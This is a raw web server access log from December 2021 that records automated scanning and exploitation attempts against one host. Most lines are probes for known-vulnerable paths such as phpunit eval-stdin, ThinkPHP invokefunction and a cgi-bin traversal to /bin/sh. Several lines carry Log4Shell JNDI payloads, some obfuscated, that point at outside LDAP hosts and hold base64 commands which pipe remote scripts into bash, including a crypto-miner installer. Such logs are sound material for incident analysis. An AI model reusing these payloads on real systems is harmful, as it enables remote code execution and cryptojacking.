45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /tpl/Public/js/layer_mobile2/layer.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /assets/version2/2_files/index.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /Public/Wap/jinrong/Mobile/weiyun/css/index.css HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET /l.php HTTP/1.1" 404 36 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
45.124.66.24 - - [23/Dec/2021:17:29:08 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
195.54.160.149 - - [23/Dec/2021:17:59:41 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}"
118.126.124.198 - - [23/Dec/2021:18:02:46 +0800] "GET /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [23/Dec/2021:18:20:38 +0800] "GET /users/sign_in HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
80.82.77.192 - - [23/Dec/2021:18:31:55 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
2.56.59.221 - - [23/Dec/2021:19:32:06 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
106.75.211.240 - - [23/Dec/2021:20:13:47 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
167.248.133.114 - - [23/Dec/2021:20:27:36 +0800] "GET / HTTP/1.1" 200 8142 "-" "-"
128.14.134.134 - - [23/Dec/2021:20:50:17 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.199.143 - - [23/Dec/2021:20:50:20 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.59 - - [23/Dec/2021:21:31:56 +0800] "GET / HTTP/1.1" 200 8142 "-" "-"
152.32.131.196 - - [23/Dec/2021:21:38:45 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
118.126.124.7 - - [23/Dec/2021:21:51:07 +0800] "GET /login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
23.90.160.114 - - [23/Dec/2021:22:42:01 +0800] "GET /solr/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
118.126.124.141 - - [23/Dec/2021:23:08:26 +0800] "GET /seeyon/thirdpartyController.do HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
198.98.49.124 - - [23/Dec/2021:23:21:45 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
167.71.255.26 - - [23/Dec/2021:23:58:33 +0800] "GET /c/version.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
167.71.255.26 - - [23/Dec/2021:23:58:36 +0800] "GET /streaming/clients_live.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
167.71.255.26 - - [23/Dec/2021:23:58:39 +0800] "GET /stalker_portal/c/version.js HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
167.71.255.26 - - [23/Dec/2021:23:58:42 +0800] "GET /stream/live.php HTTP/1.1" 404 260 "-" "AlexaMediaPlayer/2.1.4676.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.9"
167.71.255.26 - - [23/Dec/2021:23:58:51 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
2.56.57.56 - - [24/Dec/2021:01:58:11 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
2.56.57.56 - - [24/Dec/2021:01:59:44 +0800] "POST /HNAP1/ HTTP/1.1" 404 260 "-" "Mozila/5.0"
45.134.225.25 - - [24/Dec/2021:02:41:36 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
2.56.57.56 - - [24/Dec/2021:03:20:19 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
2.56.57.56 - - [24/Dec/2021:03:21:54 +0800] "POST /HNAP1/ HTTP/1.1" 404 260 "-" "Mozila/5.0"
148.72.158.94 - - [24/Dec/2021:03:48:34 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.211.189 - - [24/Dec/2021:03:54:43 +0800] "GET /actuator/health HTTP/1.1" 404 260 "-" "Mozilla/5.0 zgrab/0.x"
198.98.49.124 - - [24/Dec/2021:04:19:49 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
88.0.214.160 - - [24/Dec/2021:04:29:59 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
46.43.103.21 - - [24/Dec/2021:04:55:27 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
46.43.103.21 - - [24/Dec/2021:04:55:27 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
46.43.103.21 - - [24/Dec/2021:04:55:27 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
46.43.103.21 - - [24/Dec/2021:04:55:30 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
165.227.136.172 - - [24/Dec/2021:05:00:27 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
165.227.136.172 - - [24/Dec/2021:05:00:47 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
165.227.136.172 - - [24/Dec/2021:05:00:50 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
162.221.192.26 - - [24/Dec/2021:05:10:48 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.254.59.113 - - [24/Dec/2021:05:31:37 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
148.72.158.94 - - [24/Dec/2021:05:53:32 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
68.183.78.209 - - [24/Dec/2021:06:32:41 +0800] "GET /owa/auth/logon.aspx HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
68.183.78.209 - - [24/Dec/2021:06:32:41 +0800] "GET /owa/auth/logon.aspx HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
68.183.78.209 - - [24/Dec/2021:06:32:42 +0800] "GET / HTTP/1.1" 200 4923 "-" "python-requests/2.22.0"
117.50.7.159 - - [24/Dec/2021:07:02:09 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
195.54.160.149 - - [24/Dec/2021:07:10:03 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [24/Dec/2021:07:31:02 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.140.248.32 - - [24/Dec/2021:07:48:49 +0800] "GET / HTTP/1.1" 200 4923 "-" "python-requests/2.26.0"
187.170.189.81 - - [24/Dec/2021:07:57:14 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
118.126.124.198 - - [24/Dec/2021:08:02:46 +0800] "GET /home/login/index.html HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
148.72.158.94 - - [24/Dec/2021:08:04:34 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
118.126.124.7 - - [24/Dec/2021:08:11:07 +0800] "GET /api/upload HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
104.140.188.58 - - [24/Dec/2021:08:13:00 +0800] "GET / HTTP/1.1" 200 14759 "-" "https://gdnplus.com:Gather Analyze Provide."
196.196.41.68 - - [24/Dec/2021:08:16:38 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
106.75.164.154 - - [24/Dec/2021:08:19:35 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
195.54.160.149 - - [24/Dec/2021:08:27:11 +0800] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.103.123 - - [24/Dec/2021:08:33:39 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.209.162 - - [24/Dec/2021:08:34:01 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [24/Dec/2021:10:01:49 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [24/Dec/2021:10:17:28 +0800] "GET /console/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
47.241.208.155 - - [24/Dec/2021:10:21:53 +0800] "GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1" 404 260 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
47.241.208.155 - - [24/Dec/2021:10:21:53 +0800] "GET / HTTP/1.1" 200 14759 "-" "${jndi:ldap://121.140.99.236:1389/Exploit}"
195.54.160.149 - - [24/Dec/2021:11:15:03 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.126.124.141 - - [24/Dec/2021:11:44:38 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [24/Dec/2021:11:45:09 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [24/Dec/2021:11:45:39 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
4.17.224.134 - - [24/Dec/2021:12:00:44 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.17.224.134 - - [24/Dec/2021:12:00:44 +0800] "POST / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.54.160.149 - - [24/Dec/2021:12:05:50 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.126.124.141 - - [24/Dec/2021:12:23:03 +0800] "GET /login?q=$%7Bjndi:ldap://78.31.71.247:1389/u4eczo%7D HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
196.2.14.184 - - [24/Dec/2021:12:33:25 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.196.220.54 - - [24/Dec/2021:12:47:23 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0"
36.137.95.6 - - [24/Dec/2021:12:59:22 +0800] "POST /seeyon/thirdpartyController.do HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
36.137.95.6 - - [24/Dec/2021:12:59:22 +0800] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
36.137.95.6 - - [24/Dec/2021:12:59:23 +0800] "GET /seeyon/htmlofficeservlet HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
195.54.160.149 - - [24/Dec/2021:13:00:27 +0800] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.196.220.54 - - [24/Dec/2021:13:27:16 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.54.160.149 - - [24/Dec/2021:13:34:40 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
111.7.96.156 - - [24/Dec/2021:14:00:41 +0800] "GET / HTTP/1.1" 200 4923 "-" "Chrome/54.0 (Windows NT 10.0)"
195.54.160.149 - - [24/Dec/2021:14:22:33 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}"
212.192.216.31 - - [24/Dec/2021:14:51:52 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.98.49.124 - - [24/Dec/2021:14:56:15 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
128.14.141.34 - - [24/Dec/2021:15:54:29 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
118.126.124.172 - - [24/Dec/2021:16:26:34 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.172 - - [24/Dec/2021:16:27:04 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.172 - - [24/Dec/2021:16:27:34 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
5.143.16.135 - - [24/Dec/2021:17:31:27 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
5.143.16.135 - - [24/Dec/2021:17:31:43 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
5.143.16.135 - - [24/Dec/2021:17:31:58 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
213.33.61.94 - - [24/Dec/2021:20:12:28 +0800] "GET /invoker/readonly HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:12:28 +0800] "POST /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:12:30 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:00 +0800] "GET /script HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:01 +0800] "GET /login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:01 +0800] "GET /jenkins/login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:02 +0800] "GET /manager/html HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:02 +0800] "GET /wp-login.php HTTP/1.1" 404 36 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:32 +0800] "GET /users/sign_in HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:12:30 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
213.33.61.94 - - [24/Dec/2021:20:13:02 +0800] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1abokq3o HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
198.199.116.203 - - [24/Dec/2021:20:48:16 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
198.98.49.124 - - [24/Dec/2021:21:18:26 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
18.221.182.245 - - [24/Dec/2021:21:31:36 +0800] "GET / HTTP/1.1" 200 14759 "${jndi:ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}" "${jndi:ldap://135.148.130.60:1389/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}"
205.185.124.100 - - [24/Dec/2021:21:48:31 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
196.196.41.68 - - [24/Dec/2021:22:30:41 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
118.126.124.141 - - [24/Dec/2021:23:53:52 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
170.210.45.163 - - [25/Dec/2021:00:16:47 +0800] "GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1" 404 260 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
170.210.45.163 - - [25/Dec/2021:00:16:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "${jndi:ldap://121.140.99.236:1389/Exploit}"
170.210.45.163 - - [25/Dec/2021:00:16:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
5.235.192.164 - - [25/Dec/2021:00:36:22 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
